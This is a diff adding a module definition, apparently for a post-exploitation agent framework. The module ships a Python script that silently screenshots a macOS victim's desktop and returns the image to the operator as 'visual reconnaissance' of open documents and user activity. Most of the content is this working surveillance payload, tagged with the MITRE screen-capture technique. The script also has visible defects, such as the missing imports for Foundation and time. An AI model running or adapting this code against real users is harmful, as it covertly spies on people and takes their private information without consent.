@@ -1,0 +1,52 @@
+name: NativeScreenshot
+authors:
+  - name: Chris Ross
+    handle: '@xorrior'
+    link: https://twitter.com/xorrior
+description: |
+  Captures screenshots of macOS desktop displays using the Python
+  Quartz libraries and returns the data. Supports capturing from
+  specific monitors or all connected displays simultaneously.
+  Generates high-quality PNG images that are returned as bytes
+  for later retrieval. Provides visual reconnaissance capabilities
+  for capturing the current state of user desktops, including
+  open applications, documents, and user activity.
+software: ''
+tactics: []
+techniques:
+  - T1113
+background: false
+output_extension: png
+needs_admin: false
+opsec_safe: false
+language: python
+min_language_version: '3.6'
+comments: []
+options:
+  - name: Agent
+    description: Agent to execute module on.
+    required: true
+    value: ''
+script: |-
+  try:
+      import Quartz
+      import Quartz.CoreGraphics as CG
+      from AppKit import *
+      import binascii
+  except ImportError:
+      print("Missing required module...")
+
+  onScreenWindows = CG.CGWindowListCreate(CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID)
+  desktopElements = Foundation.CFArrayCreateMutableCopy(None, 0, onScreenWindows)
+  imageRef = CG.CGWindowListCreateImageFromArray(CG.CGRectInfinite, desktopElements, CG.kCGWindowListOptionAll)
+  rep = NSBitmapImageRep.alloc().initWithCGImage_(imageRef)
+  props = NSDictionary()
+  imageData = rep.representationUsingType_properties_(NSPNGFileType,props)
+  time.sleep(.1)
+  imageData = bytes(imageData)
+  #Don't ask why but you need the sleep statements
+  time.sleep(.1)
+  imageData = imageData.decode('latin-1')
+  time.sleep(.1)
+  print(imageData)
+  time.sleep(.1)
